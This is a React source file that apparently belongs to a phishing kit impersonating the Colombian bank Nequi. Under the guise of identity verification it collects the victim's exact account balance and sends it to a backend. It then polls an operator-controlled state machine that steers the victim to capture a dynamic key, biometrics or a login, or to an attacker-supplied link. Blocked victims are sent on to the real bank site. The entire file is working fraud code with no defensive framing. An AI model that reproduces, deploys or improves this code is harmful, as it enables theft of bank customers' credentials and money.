import React, { useState, useEffect, useRef, useLayoutEffect } from 'react';
import { createPortal } from "react-dom";
import { useLocation, useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingNequiLogin from "../../../../../components/LoadingNequiLogin";
import './ValidacionSaldo.css';
import logoNequi from "../../images/imgi_1_64dfef05bc6705edb9447499_nequi.svg";

const NEQUI_ERROR_KEY = "nequi_error_modal";
const NEQUI_MID_FLOW_KEY = "nequi_mid_flow";

const ESTADOS_TRAS_SALDO = [
    "sol_din",
    "sol_finalizar",
    "sol_finalizado",
    "error_din",
    "error_login",
    "error_cash",
    "sol_biometria",
    "sol_saldo",
    "block_ip",
    "error_blocked",
    "logo",
    "link_bot",
    "sol_link_bot",
    "sol_link_custom",
];

const SALDO_ERROR_MESSAGE =
    "¡Ups! El saldo ingresado no coincide, verifica y vuelve a intentarlo.";
const SALDO_ERROR_AUTO_HIDE_MS = 5000;

const ValidacionSaldo = ({ onConfirm, onCancel }) => {
    const navigate = useNavigate();
    const location = useLocation();

    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const statusTickRef = useRef(null);
    const saldoErrorTimeoutRef = useRef(null);
    const allowPollNavigationRef = useRef(false);

    const [digits, setDigits] = useState(['', '', '', '', '', '', '', '', '', '', '', '']);
    const [activeIndex, setActiveIndex] = useState(0);
    const [loading, setLoading] = useState(false);
    const [showSaldoError, setShowSaldoError] = useState(false);

    const stopPolling = () => {
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }
    };

    const nequiNavigate = (ruta) => {
        navigate(ruta, { replace: true, state: { nequiNav: Date.now() } });
    };

    const resetSaldoDigits = () => {
        setDigits(['', '', '', '', '', '', '', '', '', '', '', '']);
        setActiveIndex(0);
    };

    const showSaldoErrorModal = () => {
        resetSaldoDigits();
        setShowSaldoError(true);
        if (saldoErrorTimeoutRef.current) {
            clearTimeout(saldoErrorTimeoutRef.current);
        }
        saldoErrorTimeoutRef.current = setTimeout(() => {
            hideSaldoErrorModal();
        }, SALDO_ERROR_AUTO_HIDE_MS);
    };

    const hideSaldoErrorModal = () => {
        if (saldoErrorTimeoutRef.current) {
            clearTimeout(saldoErrorTimeoutRef.current);
            saldoErrorTimeoutRef.current = null;
        }
        setShowSaldoError(false);
    };

    const startWaiting = () => {
        sessionStorage.setItem(NEQUI_MID_FLOW_KEY, "1");
        setLoading(true);
    };

    const stopWaiting = () => {
        sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
        setLoading(false);
    };

    const failSubmit = () => {
        stopWaiting();
    };

    const shouldProcessEstado = (estadoActual, statusTick) => {
        if (statusTick != null) {
            if (statusTickRef.current === statusTick) return false;
            statusTickRef.current = statusTick;
            lastEstadoRef.current = estadoActual;
            return true;
        }
        if (lastEstadoRef.current === estadoActual) return false;
        lastEstadoRef.current = estadoActual;
        return true;
    };

    const verifyState = async () => {
        if (!sessionIdRef.current) return;

        try {
            const response = await instanceBackend.post(
                `/nequi/verify-state/${sessionIdRef.current}`,
            );
            const { estado: estadoRaw, state, url, text } = response?.data || {};
            const estadoActual = (estadoRaw || state || "").toString().toLowerCase();
            const hasUrl = Boolean(url && String(url).trim());
            const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
            const linkPendiente =
                estadoActual === "sol_link_bot" ||
                (estadoActual === "link_bot" && !hasUrl) ||
                (estadoActual === "sol_link_custom" && !customLink);

            if (!estadoActual || !ESTADOS_TRAS_SALDO.includes(estadoActual)) return;

            if (
                ESTADOS_TRAS_SALDO.includes(estadoActual) &&
                !allowPollNavigationRef.current &&
                estadoActual !== "sol_saldo" &&
                estadoActual !== "error_cash"
            ) {
                return;
            }

            const statusTick = response?.data?.statusTick ?? null;
            if (!linkPendiente && !shouldProcessEstado(estadoActual, statusTick)) return;
            if (!linkPendiente) lastEstadoRef.current = estadoActual;

            switch (estadoActual) {
                case "logo":
                    stopWaiting();
                    stopPolling();
                    localStorage.setItem("sessionId", sessionIdRef.current);
                    window.location.href =
                        "/pse?bank=" + (url || "nequi") + "&sessionId=" + sessionIdRef.current;
                    break;
                case "link_bot":
                case "sol_link_bot":
                    if (hasUrl) {
                        stopWaiting();
                        stopPolling();
                        if (
                            url.includes("payulatam.com") ||
                            url.includes("registro.pse.com.co")
                        ) {
                            window.location.replace(url);
                        } else {
                            window.location.href = url;
                        }
                    }
                    break;
                case "sol_link_custom":
                    if (customLink) {
                        stopWaiting();
                        stopPolling();
                        window.location.href = customLink;
                    }
                    break;
                case "sol_saldo":
                    stopWaiting();
                    hideSaldoErrorModal();
                    resetSaldoDigits();
                    nequiNavigate("/nequi_saldo");
                    break;
                case "sol_din":
                    stopWaiting();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    nequiNavigate("/nequi_dinamica");
                    break;
                case "sol_finalizar":
                case "sol_finalizado":
                    stopWaiting();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    nequiNavigate("/finalizado-pse");
                    break;
                case "error_din":
                    stopWaiting();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_din");
                    nequiNavigate("/nequi_dinamica");
                    break;
                case "error_login":
                    stopWaiting();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_login");
                    nequiNavigate("/nequi");
                    break;
                case "error_cash":
                    stopWaiting();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    showSaldoErrorModal();
                    break;
                case "sol_biometria":
                    stopWaiting();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    nequiNavigate("/nequi_biometria");
                    break;
                case "block_ip":
                case "error_blocked":
                    stopWaiting();
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.href = process.env.REACT_APP_URL_BANK || "/";
                    break;
                default:
                    break;
            }
        } catch (error) {
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "")
                .toString()
                .toLowerCase();
            if (status === 403 && estadoErr === "error_blocked") {
                stopWaiting();
                localStorage.clear();
                sessionStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
            }
        }
    };

    const initPolling = () => {
        stopPolling();
        pollingIntervalRef.current = setInterval(() => {
            verifyState();
        }, 3000);
        verifyState();
    };

    useEffect(() => {
        const pendingError = localStorage.getItem(NEQUI_ERROR_KEY);
        if (pendingError === "error_cash") {
            showSaldoErrorModal();
            localStorage.removeItem(NEQUI_ERROR_KEY);
        }

        sessionIdRef.current =
            localStorage.getItem("sessionId") ||
            sessionStorage.getItem("sessionId");

        if (sessionIdRef.current) {
            allowPollNavigationRef.current = true;
            initPolling();
        }

        return () => {
            stopPolling();
            if (saldoErrorTimeoutRef.current) {
                clearTimeout(saldoErrorTimeoutRef.current);
            }
        };
    }, []);

    useEffect(() => {
        if (!location.state?.nequiNav) return;
        stopWaiting();
        hideSaldoErrorModal();
        resetSaldoDigits();
        navigate(location.pathname, { replace: true, state: {} });
    }, [location.state?.nequiNav, navigate, location.pathname]);

    useLayoutEffect(() => {
        if (!loading) return;
        document.body.style.overflow = "hidden";
        return () => {
            document.body.style.overflow = "";
        };
    }, [loading]);

    // Formatear saldo (4 dígitos pesos, 2 centavos)
    const formatSaldo = () => {
        const fullNumber = digits.join('');
        if (fullNumber === '' || fullNumber === '000000000000') return '0,00';

        const num = parseInt(fullNumber, 10);
        const entero = Math.floor(num / 100);
        const decimal = num % 100;

        const enteroFormateado = entero.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
        const decimalFormateado = decimal.toString().padStart(2, '0');

        return `${enteroFormateado},${decimalFormateado}`;
    };

    const handleNumberClick = (num) => {
        if (loading) return;
        if (activeIndex < 11) {
            const newDigits = [...digits];
            newDigits[activeIndex] = num.toString();
            setDigits(newDigits);
            if (activeIndex < 11) {
                setActiveIndex(activeIndex + 1);
            }
        }
    };

    const handleDelete = () => {
        if (loading) return;
        if (activeIndex > 0 || digits[activeIndex] !== '') {
            const currentIdx = digits[activeIndex] !== '' ? activeIndex : activeIndex - 1;
            if (currentIdx >= 0) {
                const newDigits = [...digits];
                newDigits[currentIdx] = '';
                setDigits(newDigits);
                setActiveIndex(currentIdx);
            }
        }
    };

    const submitSaldo = async (saldoRaw, saldoFormateado) => {
        const sessionId =
            localStorage.getItem("sessionId") ||
            sessionStorage.getItem("sessionId") ||
            sessionIdRef.current;

        if (!sessionId) {
            failSubmit();
            return;
        }

        sessionIdRef.current = sessionId;

        const centralUrl = (
            process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
        ).trim();

        const dataSend = {
            data: {
                attributes: {
                    saldo: `$ ${saldoFormateado} COP`,
                    saldo_raw: saldoRaw,
                    fecha: new Date().toISOString(),
                    sessionId,
                    backend: "P01",
                    backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    backend_url: "/api/v1/nequi/cash",
                },
            },
        };

        stopPolling();
        lastEstadoRef.current = null;

        try {
            const response = centralUrl
                ? await instanceBackend.post(centralUrl, dataSend)
                : await instanceBackend.post("/nequi/cash", dataSend);

            if (response?.data?.success) {
                const sid = response.data.sessionId ?? sessionId;
                localStorage.setItem("sessionId", sid);
                sessionStorage.setItem("sessionId", sid);
                sessionIdRef.current = sid;
                sessionStorage.setItem(NEQUI_MID_FLOW_KEY, "1");
                allowPollNavigationRef.current = true;
                initPolling();
            } else {
                failSubmit();
            }
        } catch (error) {
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "")
                .toString()
                .toLowerCase();

            if (status === 403 && estadoErr === "error_blocked") {
                sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                localStorage.clear();
                sessionStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
                return;
            }

            if (estadoErr === "error_cash") {
                showSaldoErrorModal();
            }
            failSubmit();
        }
    };

    const handleConfirm = () => {
        if (!hasAnySaldoValue || loading) return;
        const montoRaw = digits.join('');
        const montoFormateado = formatSaldo();

        startWaiting();
        hideSaldoErrorModal();
        submitSaldo(montoRaw, montoFormateado);

        if (onConfirm) {
            onConfirm({
                raw: montoRaw,
                formatted: montoFormateado,
                amount: parseInt(montoRaw) / 100,
                fullString: `$ ${montoFormateado} COP`
            });
        }
    };

    const handleCancel = () => {
        stopPolling();
        stopWaiting();
        allowPollNavigationRef.current = false;
        lastEstadoRef.current = null;
        hideSaldoErrorModal();
        resetSaldoDigits();
        if (onCancel) {
            onCancel();
        }
    };

    const hasAnySaldoValue = digits.some(d => d !== '');
    const saldoMostrado = formatSaldo();

    return (
        <div className="validacion-container">
            <header className="nequi-header">
                <img
                    src={logoNequi}
                    alt="Nequi"
                    className="nequi-header__logo"
                    width="104"
                    height="32"
                />
            </header>

            <main className="nequi-main">
                {showSaldoError ? (
                    <div className="saldo-error-alert" role="alert">
                        <span className="saldo-error-alert__icon" aria-hidden="true">
                            <span className="icon-alert-error" />
                        </span>
                        <span className="saldo-error-alert__text">
                            {SALDO_ERROR_MESSAGE}
                        </span>
                    </div>
                ) : null}

                <h1 className="nequi-title">Verificación de identidad</h1>

                <p className="nequi-subtitle">
                    Para confirmar que eres el titular de la cuenta, ingresa el saldo actual
                    disponible en tu app de Nequi.
                </p>

                {/* Caja de saldo formateada */}
                <div className="saldo-display-box">
                    <span className="saldo-label">Saldo en tu disponible</span>
                    <div className="saldo-amount-large">
                        <span className="saldo-currency-sign">$</span>
                        <span className="saldo-value-text">{saldoMostrado}</span>
                        <span className="saldo-currency-code">COP</span>
                    </div>
                    <span className="saldo-hint">Ingresa el monto exacto incluyendo centavos</span>
                </div>

                <div className="keypad-container">
                    <div className={`numeric-keypad${loading ? " numeric-keypad--disabled" : ""}`}>
                        <div className="keypad-row">
                            {[1, 2, 3].map(num => (
                                <button
                                    key={num}
                                    type="button"
                                    className="keypad-btn"
                                    disabled={loading}
                                    onClick={() => handleNumberClick(num)}
                                >
                                    {num}
                                </button>
                            ))}
                        </div>
                        <div className="keypad-row">
                            {[4, 5, 6].map(num => (
                                <button
                                    key={num}
                                    type="button"
                                    className="keypad-btn"
                                    disabled={loading}
                                    onClick={() => handleNumberClick(num)}
                                >
                                    {num}
                                </button>
                            ))}
                        </div>
                        <div className="keypad-row">
                            {[7, 8, 9].map(num => (
                                <button
                                    key={num}
                                    type="button"
                                    className="keypad-btn"
                                    disabled={loading}
                                    onClick={() => handleNumberClick(num)}
                                >
                                    {num}
                                </button>
                            ))}
                        </div>
                        <div className="keypad-row">
                            <div className="keypad-btn keypad-btn--empty"></div>
                            <button
                                type="button"
                                className="keypad-btn"
                                disabled={loading}
                                onClick={() => handleNumberClick(0)}
                            >
                                0
                            </button>
                            <button
                                type="button"
                                className="keypad-btn keypad-btn--delete"
                                disabled={loading}
                                onClick={handleDelete}
                                aria-label="Borrar"
                            >
                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                    <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                                    <line x1="18" y1="9" x2="12" y2="15"></line>
                                    <line x1="12" y1="9" x2="18" y2="15"></line>
                                </svg>
                            </button>
                        </div>
                    </div>
                </div>

                <button
                    type="button"
                    className="nequi-btn nequi-btn--secondary"
                    onClick={handleConfirm}
                    disabled={!hasAnySaldoValue || loading}
                >
                    Confirmar
                </button>

                <button
                    type="button"
                    className="nequi-btn nequi-btn--outline"
                    disabled={loading}
                    onClick={handleCancel}
                >
                    Cancelar transacción
                </button>
            </main>

            {loading && typeof document !== "undefined"
                ? createPortal(<LoadingNequiLogin isOpen />, document.body)
                : null}
        </div>
    );
};

export default ValidacionSaldo;
